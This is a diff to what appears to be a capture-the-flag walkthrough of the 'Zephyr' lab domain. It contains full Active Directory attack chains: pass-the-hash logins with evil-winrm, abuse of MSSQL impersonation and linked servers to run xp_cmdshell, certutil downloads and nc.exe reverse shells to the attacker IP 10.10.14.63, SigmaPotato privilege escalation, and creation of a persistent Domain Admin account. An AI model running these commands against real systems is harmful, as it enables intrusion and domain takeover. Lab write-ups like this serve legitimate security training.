@@ -4,7 +4,7 @@ Subnet: 10.10.110.0/24
 10.10.110.2 is out-of-scope because it represents the firewall.
 
 ---
-## ZEPHYR-MAIL [x]
+## ZEPHYR-MAIL
 
 Started off with host disocvery on the subnet.
 
@@ -326,7 +326,7 @@ nmap -n -Pn -sSCV -p- 192.168.110.52-55
 ```
 
 ---
-## ZEPHYR-PNTSVC [x]
+## ZEPHYR-PNTSVC
 
 An initial scan revealed the following information about the target endpoint.
 
@@ -475,9 +475,8 @@ Let's check if we can pwn SMB there aswell, so we have instant SYSTEM Shell. We 
 nxc smb 192.168.110.53 -u users.txt -H hashes.txt --continue-on-success --local-auth
 ```
 
-
 ---
-## PNT-SVRBPA [x]
+## PNT-SVRBPA
 
 An initial scan revealed the following information about the target endpoint.
 
@@ -572,7 +571,7 @@ nxc winrm 192.168.110.54 -u blake -p 'Pass123!'
 ```
 
 ---
-## PNT-SVRPSB [x]
+## PNT-SVRPSB
 
 An initial scan revealed the following information about the target endpoint.
 
@@ -630,7 +629,7 @@ matt:L1f30f4Spr1ngCh1ck3n!
 ```
 
 ---
-## ZEPHYR-DC [x]
+## ZEPHYR-DC
 
 An initial scan revealed the following information about the target endpoint.
 
@@ -817,6 +816,42 @@ Added route on local machine.
 
 ```
 ip route add 192.168.210.0/24 dev ligolo-double
+```
+
+Also discovered another endpoint on 192.168.110.56
+
+```
+arp -a
+```
+
+---
+## ZEPHYR-WKST
+
+We identified this endpoint running after post exploitation of the Domain Controller.
+
+```
+nmap 192.168.110.56                                                              
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-03 08:44 -0500
+Nmap scan report for 192.168.110.56
+Host is up (0.023s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+5985/tcp open  wsman
+
+Nmap done: 1 IP address (1 host up) scanned in 8.60 seconds
+```
+
+Connected to target server via evil-winrm with Domain Admin Credentials
+
+```
+evil-winrm -i 192.168.110.56 -u Administrator -H 5bdd6a33efe43f0dc7e3b2435579aa53
+```
+
+Retrieved flag.txt in C:\Users\Administrator\Desktop.
+
+```
+ZEPHYR{PwN1nG_W17h_P4s5W0rd_R3U53}
 ```
 
 ---
@@ -1229,8 +1264,7 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [-] [Errno Connection error (ZPH-SVRDC01.zsm.local:445)] [Errno -2] Name or service not known
 ```
 
----
-## Fast Way of Domain Trust Abuse
+ Tried another method Fast Way of Domain Trust Abuse
 
 ```
 nxc ldap 192.168.210.16 -u Administrator -H 543beb20a2a579c7714ced68a1760d5e -M raisechild -o ETYPE=aes256
@@ -1298,12 +1332,8 @@ Retrieved flag.txt in C:\Users\Administrator\Desktop.
 ZEPHYR{34t1ng_7h3_B0n3s_0f_N3tw0rks}
 ```
 
-
-
-
-
 ---
-## ZEPHYR-MGMT [x]
+## ZEPHYR-MGMT
 
 ```
 Nmap scan report for 192.168.210.11
@@ -1643,44 +1673,44 @@ Added user jamie to CA Managers Group.
 bloodyAD -u jamie -p 'password123!' -d zsm.local --host 192.168.210.10 add groupMember 'CA Managers' jamie
 ```
 
+### Came Back here after I pwned Domain Controller
 
+Created an Domain Admin User for Persistence.
 
-```
-
-```
-
-
+Created user
 
 ```
-
+net user /add saitama password123! /domain
 ```
 
-
-
-```
+Added to Domain Admins Group
 
 ```
-
-
-
+net group "Domain Admins" saitama /add /domain
 ```
 
-```
-
-
+Reassure if change is successfull:
 
 ```
-
+net group "Domain Admins"
 ```
 
+WARNING: Create a tunnel from Zabbix, in order to see WinRM opened (& close your 2nd tunnel on 192.168.110.55)
 
+Connected to the Target Server
 
 ```
+evil-winrm -i 192.168.210.12 -u saitama -p 'password123!'
+```
 
+Retrieved flag.txt in C:\Users\Public\Desktop
+
+```
+ZEPHYR{C0n57r4in3d_d3l3g4710n_1s_d4ng3r0us}
 ```
 
 ---
-## ZEPHYR-ZABBIX [x]
+## ZEPHYR-ZABBIX
 
 ```
 Nmap scan report for 192.168.210.13
@@ -1889,77 +1919,16 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 627.69 seconds
 ```
 
-
-
-```
+Connected to the target server.
 
 ```
-
-
-
+evil-winrm -i 192.168.210.14 -u saitama -p 'password123!'
 ```
 
-```
-
-
+Retrieved flag.txt in C:\Users\Administrator\Desktop.
 
 ```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-
-```
-
-```
-
-
-
-```
-
+ZEPHYR{C4n7_F0rg3t_ab0u7_7h1s_0n3}
 ```
 
 ---
@@ -1985,36 +1954,108 @@ Host script results:
 |_    Message signing enabled and required
 ```
 
+Connected to the target server.
 
+```
+evil-winrm -i 192.168.210.15 -u saitama -p 'password123!'
+```
 
+Retrieved flag.txt in C:\Users\Administrator\Desktop.
+
+```
+ZEPHYR{SQLi_2_Imp3rs0n4710n_fun}
+```
+
+Post exploitation revealed that there seems to be an connection to another internal network. An ARP Scan revealed
+
+```
+arp -a
+
+Interface: 192.168.210.15 --- 0x4
+  Internet Address      Physical Address      Type
+  192.168.210.1         a2-de-ad-2e-fd-de     dynamic
+  192.168.210.10        a2-de-ad-2a-d0-9b     dynamic
+  192.168.210.11        a2-de-ad-7c-01-cd     dynamic
+  192.168.210.12        a2-de-ad-fd-c4-f1     dynamic
+  192.168.210.13        a2-de-ad-95-85-11     dynamic
+  192.168.210.14        a2-de-ad-5e-27-4f     dynamic
+  192.168.210.16        a2-de-ad-bc-65-72     dynamic
+  192.168.210.17        a2-de-ad-6d-5d-ca     dynamic
+  192.168.210.18        a2-de-ad-c3-f0-34     dynamic
+  192.168.210.19        a2-de-ad-24-e5-e8     dynamic
+  192.168.210.255       ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+```
+
+Which revealed 3 more endpoints!
+
+Tried if we can reach any of those newly discovered endpoints .17 .18 .19
+
+We can reach all!
+
+```
+TNC -computer 192.168.210.19
+```
+
+I got an hint in order to exploit SQL02 I need to first get in ZEPHYR-SQL01. I connected to the target server using the previously discovered credentials from ZABBIX.
+
+```
+zabbix:rDhHbBEfh35sMbkY
+```
+
+xp_cmdshell & xp_dirtree wasn't possible. 
+
+The databases themselves were also not interesting. But I was able to discover that we can impersonate the "sa" user.
+
+```
+nxc mssql 192.168.210.15 -u zabbix -p 'rDhHbBEfh35sMbkY' -M enum_impersonate --local-auth
+MSSQL       192.168.210.15  1433   ZPH-SVRSQL01     [*] Windows 10 / Server 2019 Build 17763 (name:ZPH-SVRSQL01) (domain:zsm.local) (EncryptionReq:False)
+MSSQL       192.168.210.15  1433   ZPH-SVRSQL01     [+] ZPH-SVRSQL01\zabbix:rDhHbBEfh35sMbkY 
+ENUM_IMP... 192.168.210.15  1433   ZPH-SVRSQL01     [+] Users with impersonation rights:
+ENUM_IMP... 192.168.210.15  1433   ZPH-SVRSQL01     [*]   - sa
+```
+
+Connected to the database again and prompted the following command.
+
+```
+EXECUTE AS LOGIN = 'sa'
+```
+
+xp_cmdshell was deactivated, but xp_dirtree works. Which means we now have command execution!
+
+Let's try & test if we can activate xp_cmdshell!
+
+1. Step: Show advanced options (required)
+
+```
+EXEC sp_configure 'show advanced options', '1';
 ```
 
 ```
+RECONFIGURE;
+```
 
+2. Step: Enable xp_cmdshell
 
-
+```
+EXEC sp_configure 'xp_cmdshell', '1';
 ```
 
 ```
-
-
-
+RECONFIGURE;
 ```
 
-```
-
-
-
+3. Step: Verify it's enabled
 
 ```
-
+EXEC sp_configure 'xp_cmdshell';
 ```
 
+It worked, we have Command Execution! Since we know there is some connection to 192.168.210.19 who seems to also be an MSSQL-Server, we assume it's an linked MSSQL Server. Let's abuse this to execute commands onto 192.168.210.19!
 
-
-```
-
-```
+Continued documentation on ZEPHYR-SQL02
 
 ---
 ## ZEPHYR-CDC
@@ -2208,175 +2249,255 @@ Retrieved flag.txt in C:\Users\Administrator\Desktop.
 ZEPHYR{In73rn4l_D0m41n_D0m1n473d}
 ```
 
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
 ---
-## ZEPHYR-HR
+## ZEPHYR-HR 
 
 192.168.210.17
 
+Let's connect to the target server using the previously created DA for internal.zsm.local
+
+```
+evil-winrm -i 192.168.210.17 -u saitama2 -p 'password123!'
+```
+
+Retrieved flag.txt in C:\Users\Administrator\Desktop.
+
+```
+ZEPHYR{S3rv1c3_M4n4g3m3nt_f41L5}
+```
+
+Since we previously couldn't reach 192.168.210.18, let's check if we can reach it through HR.
+
+```
+TNC -computer 192.168.210.18
+```
+
+We can! Let's setup another pivot.
+
+Started up ligolo interface.
+
+```
+sudo ip tuntap add user saitama mode tun ligolo-double && sudo ip link set ligolo-double up && ligolo-proxy -selfcert -laddr 0.0.0.0:443
+```
+
+Transfered ligolo agent.
+
+```
+iwr -uri http://10.10.14.63:123/agent.exe -OutFile agent.exe
+```
+
+Executed reverse connection.
+
+```
+./agent.exe -connect 10.10.14.63:443 -ignore-cert
 ```
 
 ```
-
-
-
+session
+start --tun ligolo-double
 ```
 
-```
-
-
+Added an route to the last endpoint.
 
 ```
-
+ip route add 192.168.210.18 dev ligolo-double
 ```
 
-
-
-```
+Now evil-winrm is available.
 
 ```
+nmap 192.168.210.18
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-03 07:59 -0500
+Nmap scan report for 192.168.210.18
+Host is up (0.015s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+5985/tcp open  wsman
 
-
-
+Nmap done: 1 IP address (1 host up) scanned in 10.52 seconds
 ```
 
-```
+Let's connect to SRVRCSUP
 
 ---
 ## ZEPHYR-SRVRCSUP
 
 192.168.210.18
 
+Connected to the target.
+
+```
+evil-winrm -i 192.168.210.18 -u saitama2 -p 'password123!'
+```
+
+Retrieved flag.txt in C:\Users\Administrator\Desktop.
+
+```
+ZEPHYR{D0n7_f0rg3t_Imp0rt4nt_Inf0rm4710n}
+```
+
+---
+## ZEPHYR-SQL02
+
+```
+nmap -F 192.168.210.19
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-03 06:31 -0500
+Nmap scan report for 192.168.210.19
+Host is up (0.038s latency).
+Not shown: 99 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+1433/tcp open  ms-sql-s
+
+Nmap done: 1 IP address (1 host up) scanned in 4.40 seconds
+```
+
+Connected to the target server with the retrieved mssql credentials.
+
+```
+impacket-mssqlclient mssql_svc:'ToughPasswordToCrack123!'@192.168.210.19 -windows-auth
+```
+
+But this didn't work!
+
+Checked all Servers via trusted link from SQL01 Session
+
+if we get isremote=0 means it's linked.
+
+```
+SELECT srvname, isremote FROM sysservers
+srvname         isremote   
+-------------   --------   
+ZPH-SVRSQL01           1   
+ZSM-SVRCSQL02          0
+```
+
+We have an linked MSSQL-Server and identified an Link TO SQL02
+
+```
+EXECUTE('exec master xp_cmdshell '''whoami''') AT [ZSM-SVRCSQL02]
+```
+
+This didn't work.
+
+Activated xp_cmdshell remotely.
+
+```
+EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [ZSM-SVRCSQL02];
 ```
 
 ```
+EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [ZSM-SVRCSQL02];
+```
 
+Now retry command and worked.
 
+```
+EXEC ('xp_cmdshell ''whoami''') AT [ZSM-SVRCSQL02];
+```
+
+Transfered nc.exe onto target server
+
+```
+EXEC ('xp_cmdshell ''certutil -urlcache -split -f http://10.10.14.63:445/nc.exe C:\Windows\Tasks\nc.exe''') AT [ZSM-SVRCSQL02];
+```
+
+Started up listener on port 53.
+
+```
+rlwrap nc -lvnp 53
+```
+
+Executed the following command to get an reverse connection:
+
+```
+EXEC ('xp_cmdshell ''C:\Windows\Tasks\nc.exe 10.10.14.63 53 -e cmd.exe''') AT [ZSM-SVRCSQL02];
+```
+
+Gained RCE as mssql_svc account.
+
+```
+rlwrap nc -lvnp 53
+listening on [any] 53 ...
+connect to [10.10.14.63] from (UNKNOWN) [10.10.110.35] 33642
+Microsoft Windows [Version 10.0.20348.5139]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32
+```
+
+Enumerated Privileges and identified SeImpersonatePrivilege open!
+
+```
+whoami /all
+```
+
+Let's abuse PrintSpoofer to get SYSTEM Shell!
+
+Didn't work. SweetPotato also didn't work.
+
+I downloaded SigmaPotato.exe onto the target server, since it's very good for Windows Server 2022.
+
+```
+SigmaPotato.exe "whoami"
+```
+
+It worked! We have Command Execution, let's now reuse the nc.exe in order to get SYSTEM Shell.
+
+Started up listener on port 445.
+
+```
+rlwrap nc -lvnp 445
+```
+
+Executed the following command.
+
+```
+SigmaPotato.exe "C:\Windows\Tasks\nc.exe 10.10.14.63 445 -e cmd.exe"
+```
+
+Gained SYSTEM Shell.
+
+```
+rlwrap nc -lvnp 445
+listening on [any] 445 ...
+connect to [10.10.14.63] from (UNKNOWN) [10.10.110.35] 38009
+Microsoft Windows [Version 10.0.20348.5139]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Temp>
 
 ```
 
-```
-
-
+Retrieved flag.txt in C:\Users\Administrator\Desktop.
 
 ```
-
+ZEPHYR{G0tt4_l1nk_Up_4m_1_r1gh7?}
 ```
 
-
-
-```
+In order to reach the other internal endpoints, let's create another pivot!
 
 ```
-
-
-
+sudo ip tuntap add user saitama mode tun ligolo-triple && sudo ip link set ligolo-triple up && ligolo-proxy -selfcert -laddr 0.0.0.0:53
 ```
 
 ```
-
-
-
+certutil -urlcache -split -f http://10.10.14.63:123/agent.exe agent.exe
 ```
 
-```
+After creating this pivot, I'm able to connect to ZEPHYR-HR (192.168.210.17).
 
-
-
-```
+WARNING: It's important to not do an fast scan here! Otherwise it could miss the port.
 
 ```
+nmap 192.168.210.17 
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-03 07:39 -0500
+Nmap scan report for 192.168.210.17
+Host is up (0.019s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+5985/tcp open  wsman
 
-
-
+Nmap done: 1 IP address (1 host up) scanned in 12.62 seconds
 ```
 
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
-
-
-
-```
-
-```
+Let's proceed with HR
